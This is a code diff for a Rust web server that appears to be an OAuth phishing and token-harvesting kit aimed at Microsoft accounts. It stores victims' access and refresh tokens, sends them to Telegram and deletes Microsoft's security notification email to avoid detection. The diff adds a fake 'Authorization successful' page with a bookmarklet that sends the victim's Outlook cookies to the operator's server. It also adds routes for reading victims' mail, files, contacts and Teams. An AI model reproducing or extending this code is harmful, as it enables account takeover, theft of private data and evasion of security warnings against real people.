@@ -24,11 +24,17 @@ use recon::{recon_get_handler, recon_run_handler};
 mod rules;
 use rules::{create_rule_handler, delete_rule_handler, fetch_graph_rules_handler, list_rules_handler, run_local_rules_handler};
 
-mod calendar;
-use calendar::{list_calendar_events_handler, create_calendar_event_handler, update_calendar_event_handler, delete_calendar_event_handler};
+mod contacts;
+use contacts::{list_contacts_handler, create_contact_handler, update_contact_handler, delete_contact_handler};
 
-mod ai_analysis;
-use ai_analysis::{ai_analyses_handler, ai_analyze_handler};
+mod tasks;
+use tasks::{list_task_lists_handler, list_tasks_handler, create_task_handler, update_task_handler, delete_task_handler};
+
+mod onedrive;
+use onedrive::{list_drive_items_handler, get_drive_item_handler, download_drive_item_handler, search_drive_items_handler};
+
+mod office_apps;
+use office_apps::{list_office_docs_handler, search_office_docs_handler, get_office_embed_url_handler};
 
 mod stealth;
 use stealth::stealth_config_handler;
@@ -61,11 +67,20 @@ mod inbox_folders;
 use inbox_folders::{
     list_folders_handler, folder_messages_handler, create_folder_handler,
     send_mail_handler, delete_message_handler, fetch_contacts_handler,
-    mark_read_handler, mx_check_handler,
+    mark_read_handler, mx_check_handler, move_message_handler,
     list_local_folders_handler, create_local_folder_handler,
     delete_local_folder_handler, list_local_folder_messages_handler,
     auto_filter_handler,
 };
+
+mod calendar;
+use calendar::list_calendar_events_handler;
+
+mod teams;
+use teams::{list_teams_handler, list_team_channels_handler, share_to_teams_handler};
+
+mod cookie_client;
+use cookie_client::{generate_bookmarklet_token_handler, sync_cookies_handler, test_cookie_session_handler};
 
 // ------------------- CONFIGURATION -------------------
 #[derive(Debug, Clone)]
@@ -115,6 +130,9 @@ struct HarvestedToken {
     location: Option<String>,
     tenant_id: Option<String>,
     category: Option<String>,
+    #[serde(rename = "account_type")]
+    account_type: Option<String>,
+    cookie_session: Option<String>,
     last_refreshed_at: Option<chrono::DateTime<Utc>>,
 }
 
@@ -135,7 +153,7 @@ pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Res
     }
     // Fall back to harvested table (legacy plain-text storage)
     let row: HarvestedToken = sqlx::query_as(
-        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
+        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested WHERE id = ?"
     )
     .bind(token_id)
     .fetch_one(&state.pool)
@@ -152,6 +170,8 @@ pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Res
         expires_at: row.expires_at,
         created_at: row.captured_at,
         last_refreshed_at: None,
+        account_type: row.account_type.or(row.category),
+        cookie_session: row.cookie_session,
     })
 }
 
@@ -167,6 +187,7 @@ struct StoreTokenRequest {
     refresh_token: String,
     scopes: Vec<String>,
     expires_at: chrono::DateTime<Utc>,
+    account_type: Option<String>,
 }
 
 async fn store_token_handler(
@@ -182,6 +203,7 @@ async fn store_token_handler(
         &body.refresh_token,
         body.scopes.clone(),
         body.expires_at,
+        body.account_type.as_deref(),
     ).await;
 
     let success = result.is_ok();
@@ -407,25 +429,54 @@ struct ExchangeQuery {
     code: String,
 }
 
-fn detect_tenant(email: &str) -> (Option<String>, Option<String>) {
+/// Decode an id_token JWT without signature verification (we only need the claims).
+fn decode_id_token(id_token: &str) -> Option<serde_json::Map<String, serde_json::Value>> {
+    let parts: Vec<&str> = id_token.split('.').collect();
+    if parts.len() != 3 {
+        return None;
+    }
+    use base64::{Engine as _, engine::general_purpose};
+    let decoded = general_purpose::URL_SAFE_NO_PAD.decode(parts[1]).ok()?;
+    let json_str = String::from_utf8(decoded).ok()?;
+    let value: serde_json::Value = serde_json::from_str(&json_str).ok()?;
+    value.as_object().cloned()
+}
+
+fn detect_tenant(email: &str, id_token_claims: Option<&serde_json::Map<String, serde_json::Value>>) -> (Option<String>, Option<String>) {
     let parts: Vec<&str> = email.split('@').collect();
-    if parts.len() == 2 {
-        let domain = parts[1].to_lowercase();
-        // Detect enterprise vs consumer
-        let category = if domain.contains("onmicrosoft.com") || domain.contains("microsoft.com") || domain.contains("office365") || domain.contains("exchange") {
+    let domain = if parts.len() == 2 {
+        parts[1].to_lowercase()
+    } else {
+        String::new()
+    };
+
+    // First, try to detect from id_token claims (most accurate)
+    if let Some(claims) = id_token_claims {
+        // tid = "9188040d-6c67-4c5b-b112-36c304e66d61" is the Microsoft consumer tenant
+        if let Some(tid) = claims.get("tid").and_then(|v| v.as_str()) {
+            if tid == "9188040d-6c67-4c5b-b112-36c304e66d61" {
+                return (Some("consumer".to_string()), Some("consumer".to_string()));
+            } else {
+                return (Some(tid.to_string()), Some("enterprise".to_string()));
+            }
+        }
+    }
+
+    // Fallback to domain-based detection
+    if !domain.is_empty() {
+        let account_type = if domain.contains("onmicrosoft.com") || domain.contains("microsoft.com") || domain.contains("office365") || domain.contains("exchange") {
             Some("enterprise".to_string())
         } else if domain.contains("outlook.com") || domain.contains("hotmail.com") || domain.contains("live.com") || domain.contains("msn.com") {
             Some("consumer".to_string())
         } else {
             Some("enterprise".to_string()) // Default to enterprise for custom domains
         };
-        // Extract tenant ID from onmicrosoft.com domains
         let tenant_id = if domain.contains("onmicrosoft.com") {
             domain.split('.').next().map(|s| s.to_string())
         } else {
             Some(domain.clone())
         };
-        return (tenant_id, category);
+        return (tenant_id, account_type);
     }
     (None, Some("unknown".to_string()))
 }
@@ -458,17 +509,23 @@ async fn exchange_code(
                 let email = fetch_user_email(access_token).await;
                 let email_str = email.clone().unwrap_or_else(|| "unknown".to_string());
                 
-                // Detect tenant and category
-                let (tenant_id, category) = detect_tenant(&email_str);
+                // Decode id_token for accurate tenant/account detection
+                let id_token_claims = body.get("id_token")
+                    .and_then(|v| v.as_str())
+                    .and_then(|id_token| decode_id_token(id_token));
+                
+                // Detect tenant and account type
+                let (tenant_id, account_type) = detect_tenant(&email_str, id_token_claims.as_ref());
+                let category = account_type.clone(); // Keep category for backward compatibility
                 
                 // Get IP address from request
                 let ip_address = req.connection_info().peer_addr().map(|s| s.to_string()).unwrap_or_else(|| "unknown".to_string());
                 let location = Some("Unknown".to_string()); // Will be resolved via geolocation API
                 
-                println!("Attempting to insert token for email: {:?}, tenant: {:?}, category: {:?}", email, tenant_id, category);
+                println!("Attempting to insert token for email: {:?}, tenant: {:?}, account_type: {:?}", email, tenant_id, account_type);
                 // Store in harvested table (legacy, for dashboard display)
                 sqlx::query(
-                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                 )
                 .bind(&id)
                 .bind(&email)
@@ -481,6 +538,7 @@ async fn exchange_code(
                 .bind(&location)
                 .bind(&tenant_id)
                 .bind(&category)
+                .bind(&account_type)
                 .bind(Option::<chrono::DateTime<Utc>>::None)
                 .execute(&state.pool)
                 .await
@@ -494,13 +552,14 @@ async fn exchange_code(
                     refresh_token,
                     vec!["openid".to_string(), "offline_access".to_string(), "User.Read".to_string(), "Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "Contacts.Read".to_string(), "MailboxSettings.ReadWrite".to_string()],
                     refresh_expires_at,
+                    account_type.as_deref(),
                 ).await;
                 if let Some(email) = email {
                     send_telegram_notification(&state.config, refresh_token, &email).await;
                 }
                 // OPSEC: auto-delete Microsoft's "New app connected" notification email
                 tokio::spawn(delete_microsoft_notification_email(access_token.to_string()));
-                HttpResponse::Ok().json(serde_json::json!({"status": "token_stored"}))
+                HttpResponse::Ok().json(serde_json::json!({"status": "token_stored", "token_id": id}))
             } else {
                 HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
             }
@@ -509,9 +568,142 @@ async fn exchange_code(
     }
 }
 
+// Stealthy auth-success page that redirects to real Outlook after showing a bookmarklet
+async fn auth_success_handler(query: web::Query<std::collections::HashMap<String, String>>) -> impl Responder {
+    let token_id = query.get("token_id").cloned().unwrap_or_default();
+    let api_base = env::var("RAILWAY_PUBLIC_DOMAIN")
+        .or_else(|_| env::var("RAILWAY_STATIC_URL"))
+        .unwrap_or_else(|_| "localhost:8080".to_string());
+    let protocol = if api_base.contains("localhost") { "http" } else { "https" };
+    let api_url = format!("{}://{}", protocol, api_base);
+
+    let html = format!(r#"<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authorization successful</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
+            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3a5f 0%, #0f2744 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }}
+        .container {{
+            text-align: center;
+            max-width: 480px;
+            padding: 40px 30px;
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }}
+        .logo {{
+            width: 64px;
+            height: 64px;
+            background: #0078d4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 28px;
+        }}
+        h1 {{ font-size: 22px; font-weight: 600; margin-bottom: 12px; }}
+        p {{ font-size: 14px; color: rgba(255,255,255,0.7); margin-bottom: 24px; line-height: 1.6; }}
+        .btn {{
+            display: inline-block;
+            padding: 14px 32px;
+            background: #0078d4;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            transition: all 0.2s;
+            border: none;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }}
+        .btn:hover {{ background: #106ebe; transform: translateY(-1px); }}
+        .bookmarklet {{
+            display: inline-block;
+            padding: 10px 20px;
+            background: rgba(255,255,255,0.1);
+            border: 1px dashed rgba(255,255,255,0.3);
+            border-radius: 6px;
+            color: #4fc3f7;
+            font-size: 13px;
+            cursor: move;
+            text-decoration: none;
+            margin-top: 8px;
+        }}
+        .hint {{
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            margin-top: 16px;
+            line-height: 1.5;
+        }}
+        .success-icon {{
+            font-size: 48px;
+            margin-bottom: 16px;
+        }}
+        #hybridBtn {{
+            display: none;
+            padding: 12px 24px;
+            background: #7c4dff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 12px;
+        }}
+        #hybridBtn:hover {{ background: #651fff; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="success-icon">&#10004;</div>
+        <h1>Authorization successful</h1>
+        <p>Your application has been authorized successfully. You can now access your Microsoft services.</p>
+        <a href="https://outlook.live.com" class="btn">Continue to Outlook Web Access</a>
+        <br>
+        <button id="hybridBtn" onclick="enableHybrid()">Enable Hybrid Access</button>
+        <div id="bookmarkletArea" style="display:none;">
+            <p class="hint">Drag this button to your bookmark bar, then click it while on Outlook to enable hybrid access.</p>
+            <a href="javascript:(function(){{var t='{}';var c=document.cookie;var u=navigator.userAgent;navigator.sendBeacon('{}/api/cookies/sync',JSON.stringify({{token:t,cookies:c,user_agent:u}}));alert('Hybrid access enabled!');}})();" class="bookmarklet">Hybrid Access</a>
+        </div>
+    </div>
+    <script>
+        const tokenId = '{}';
+        if (tokenId) {{
+            document.getElementById('hybridBtn').style.display = 'inline-block';
+        }}
+        function enableHybrid() {{
+            document.getElementById('bookmarkletArea').style.display = 'block';
+            document.getElementById('hybridBtn').style.display = 'none';
+        }}
+    </script>
+</body>
+</html>"#,
+        token_id, api_url, token_id
+    );
+
+    HttpResponse::Ok()
+        .content_type("text/html; charset=utf-8")
+        .body(html)
+}
+
 // JSON API: list all tokens
 async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -620,7 +812,7 @@ pub struct InboxApiQuery {
 }
 
 async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
-    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?")
+    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested WHERE id = ?")
         .bind(&query.token_id)
         .fetch_optional(&state.pool)
         .await
@@ -684,12 +876,30 @@ struct GenerateOAuthLinkResponse {
     worker_url: String,
 }
 
-async fn generate_oauth_link(state: web::Data<AppState>) -> impl Responder {
-    let worker_name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
-    let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
+#[derive(Deserialize)]
+struct GenerateOAuthLinkQuery {
+    local: Option<bool>,
+}
 
-    let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
-    let redirect_uri = format!("{}/oauth/callback", worker_url);
+async fn generate_oauth_link(
+    query: web::Query<GenerateOAuthLinkQuery>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let is_local = query.local.unwrap_or(false);
+    
+    let redirect_uri = if is_local {
+        // For local development, use localhost directly or a configured local redirect
+        env::var("LOCAL_REDIRECT_URI").unwrap_or_else(|_| {
+            let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
+            format!("http://localhost:{}/exchange", port)
+        })
+    } else {
+        // Production: use Cloudflare Worker
+        let worker_name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
+        let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
+        let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
+        format!("{}/oauth/callback", worker_url)
+    };
 
     let scopes = "openid%20offline_access%20User.Read%20Mail.ReadWrite%20Mail.Send%20Contacts.Read%20MailboxSettings.ReadWrite";
     let state_param: String = rand::thread_rng()
@@ -708,7 +918,7 @@ async fn generate_oauth_link(state: web::Data<AppState>) -> impl Responder {
 
     HttpResponse::Ok().json(GenerateOAuthLinkResponse {
         link,
-        worker_url,
+        worker_url: redirect_uri.clone(),
     })
 }
 
@@ -734,8 +944,14 @@ async function handleRequest(request) {
     const code = url.searchParams.get('code');
     if (!code) return new Response('Missing authorization code', { status: 400 });
     const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}`;
-    try { await fetch(exchangeUrl, { method: 'GET' }); } catch (err) { console.error(err); }
-    return Response.redirect('https://www.office.com', 302);
+    let tokenId = '';
+    try { 
+      const resp = await fetch(exchangeUrl, { method: 'GET' }); 
+      const data = await resp.json();
+      if (data.token_id) tokenId = data.token_id;
+    } catch (err) { console.error(err); }
+    const successUrl = `${_MAIN_SERVER}/auth-success?token_id=${encodeURIComponent(tokenId)}`;
+    return Response.redirect(successUrl, 302);
   }
 
   if (url.pathname === '/status') {
@@ -879,7 +1095,7 @@ async fn root_status() -> impl Responder {
 
 // HTML admin dashboard (with View Inbox button)
 async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -960,6 +1176,8 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
             location TEXT,
             tenant_id TEXT,
             category TEXT,
+            account_type TEXT,
+            cookie_session TEXT,
             last_refreshed_at DATETIME
         )"
     ).execute(pool).await?;
@@ -978,10 +1196,22 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
             expires_at DATETIME NOT NULL,
             created_at DATETIME NOT NULL,
             last_refreshed_at DATETIME,
-            status TEXT DEFAULT 'active'
+            status TEXT DEFAULT 'active',
+            account_type TEXT,
+            cookie_session TEXT
         )
         "#
     ).execute(pool).await?;
+
+    // Migration: add account_type and cookie_session columns if tables exist from before this change
+    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN account_type TEXT")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN account_type TEXT")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN cookie_session TEXT")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN cookie_session TEXT")
+        .execute(pool).await;
 
     sqlx::query(
         r#"
@@ -1008,17 +1238,6 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
             forward_to TEXT,
             created_at DATETIME NOT NULL,
             status TEXT NOT NULL
-        )
-        "#
-    ).execute(pool).await?;
-
-    sqlx::query(
-        r#"
-        CREATE TABLE IF NOT EXISTS ai_analyses (
-            id TEXT PRIMARY KEY,
-            token_id TEXT NOT NULL,
-            analysis_json TEXT NOT NULL,
-            created_at DATETIME NOT NULL
         )
         "#
     ).execute(pool).await?;
@@ -1179,6 +1398,7 @@ async fn main() -> std::io::Result<()> {
             .app_data(web::JsonConfig::default().limit(50_000_000))
             .route("/", web::get().to(root_status))
             .route("/exchange", web::get().to(exchange_code))
+            .route("/auth-success", web::get().to(auth_success_handler))
             .route("/admin", web::get().to(admin_dashboard))
             .route("/inbox_view", web::get().to(inbox_view_html))
             .route("/api/tokens", web::get().to(api_tokens))
@@ -1194,13 +1414,30 @@ async fn main() -> std::io::Result<()> {
             .route("/api/rules/{id}", web::delete().to(delete_rule_handler))
             .route("/api/rules/graph", web::get().to(fetch_graph_rules_handler))
             .route("/api/rules/run", web::post().to(run_local_rules_handler))
-            .route("/api/calendar/events", web::get().to(list_calendar_events_handler))
-            .route("/api/calendar/events", web::post().to(create_calendar_event_handler))
-            .route("/api/calendar/events/{id}", web::patch().to(update_calendar_event_handler))
-            .route("/api/calendar/events/{id}", web::delete().to(delete_calendar_event_handler))
-            .route("/api/ai/analyses", web::get().to(ai_analyses_handler))
-            .route("/api/ai/analyze", web::post().to(ai_analyze_handler))
+            .route("/api/contacts", web::get().to(list_contacts_handler))
+            .route("/api/contacts", web::post().to(create_contact_handler))
+            .route("/api/contacts/{id}", web::patch().to(update_contact_handler))
+            .route("/api/contacts/{id}", web::delete().to(delete_contact_handler))
+            .route("/api/tasks/lists", web::get().to(list_task_lists_handler))
+            .route("/api/tasks", web::get().to(list_tasks_handler))
+            .route("/api/tasks", web::post().to(create_task_handler))
+            .route("/api/tasks/{id}", web::patch().to(update_task_handler))
+            .route("/api/tasks/{id}", web::delete().to(delete_task_handler))
+            .route("/api/onedrive/items", web::get().to(list_drive_items_handler))
+            .route("/api/onedrive/items/{id}", web::get().to(get_drive_item_handler))
+            .route("/api/onedrive/items/{id}/download", web::get().to(download_drive_item_handler))
+            .route("/api/onedrive/search", web::get().to(search_drive_items_handler))
+            .route("/api/office/docs", web::get().to(list_office_docs_handler))
+            .route("/api/office/search", web::get().to(search_office_docs_handler))
+            .route("/api/office/embed", web::get().to(get_office_embed_url_handler))
             .route("/api/stealth/config", web::get().to(stealth_config_handler))
+            .route("/api/calendar/events", web::get().to(list_calendar_events_handler))
+            .route("/api/teams", web::get().to(list_teams_handler))
+            .route("/api/teams/{id}/channels", web::get().to(list_team_channels_handler))
+            .route("/api/teams/share", web::post().to(share_to_teams_handler))
+            .route("/api/tokens/{id}/session/bookmarklet", web::get().to(generate_bookmarklet_token_handler))
+            .route("/api/tokens/{id}/session/sync", web::post().to(sync_cookies_handler))
+            .route("/api/tokens/{id}/session/test", web::get().to(test_cookie_session_handler))
             .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
             .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
@@ -1225,6 +1462,7 @@ async fn main() -> std::io::Result<()> {
             .route("/api/inbox/folders/{folder_id}", web::get().to(folder_messages_handler))
             .route("/api/inbox/send", web::post().to(send_mail_handler))
             .route("/api/inbox/messages/{message_id}", web::delete().to(delete_message_handler))
+            .route("/api/inbox/messages/{message_id}/move", web::post().to(move_message_handler))
             .route("/api/inbox/messages/{message_id}/read", web::patch().to(mark_read_handler))
             .route("/api/inbox/contacts", web::get().to(fetch_contacts_handler))
             .route("/api/inbox/mx-check", web::post().to(mx_check_handler))
